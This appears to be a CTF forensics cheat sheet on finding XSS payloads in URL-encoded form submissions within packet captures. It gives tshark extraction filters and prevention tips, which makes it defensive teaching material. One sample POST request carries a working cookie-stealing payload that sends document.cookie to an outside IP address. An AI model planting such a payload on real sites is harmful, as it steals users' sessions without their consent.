### XSS in URL-Encoded HTML Forms

XSS (Cross-Site Scripting) is a vulnerability allowing attackers to inject malicious scripts into web pages viewed by others. This occurs in HTML forms using `application/x-www-form-urlencoded` encoding when input isn't validated or sanitized. Attackers submit scripts in form fields, executed in victims' browsers.

In CTF forensics, analyze PCAPs for XSS payloads in POST requests, often in login or comment forms.

#### XSS Types

  * **Reflected XSS**: Payload in request, reflected in response (e.g., search results).
  * **Stored XSS**: Payload stored on server, displayed to users (e.g., comments).
  * **DOM-Based XSS**: Client-side manipulation via DOM.

#### How It Works

  1. Attacker submits form with script in input (e.g., `<script>alert('XSS')</script>`).
  2. Server processes without sanitization.
  3. Script executes in victim's browser, potentially stealing cookies or redirecting.

#### Example Vulnerable Form

```
<form action="login.php" method="post" enctype="application/x-www-form-urlencoded">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

  * **Attacker Input**

    * Username: `<script>alert('XSS')</script>`
    * Password: `anything`

  * **Wireshark Parameters**

    ```
    Form item: "username" = "<script>alert('XSS')</script>"
    Form item: "password" = "anything"
    ```

#### PHP Form POST Example

```
POST /reviews.php HTTP/1.1
Host: shopsphere.com
Content-Type: application/x-www-form-urlencoded

review=%3Cscript%3Efetch%28%27http%3A%2F%2F111.224.180.128%2F%27+%2B+document.cookie%29%3B%3C%2Fscript%3E
```

Decoded: `review=<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

#### Wireshark Extraction Commands

```bash
# Extract username/password from POST
tshark -r capture.pcap -T fields -Y 'http and http.request.method == "POST" and urlencoded-form contains "username"' -e http.file_data | xxd -p -r

# Find XSS payloads in forms
tshark -r capture.pcap -T fields -Y 'http and http.request.method == "POST" and urlencoded-form contains "script"' -e http.file_data | xxd -p -r

# Monitor cookie changes
tshark -r capture.pcap -T fields -Y 'http and ip.src == 192.168.1.100' -e http.cookie_pair | xxd -p -r

# Admin visiting page with payload
tshark -r capture.pcap -T fields -Y 'http and ip.src != <attacker_ip> and http.request.uri contains "reviews.php"' -e http.cookie_pair | xxd -p -r
```

#### Prevention

  * **Input Sanitization**: Use libraries like DOMPurify or htmlspecialchars().
  * **Content Security Policy (CSP)**: Restrict script sources.
  * **Output Encoding**: Encode user input before rendering.
  * **Validation**: Whitelist allowed characters.

#### CTF Tips

  * Look for encoded payloads (e.g., `%3Cscript%3E`).
  * Correlate with stolen cookies or redirects.
  * Test with tools like Burp Suite or XSS payloads from OWASP.

-----

**Made with love by VIsh0k**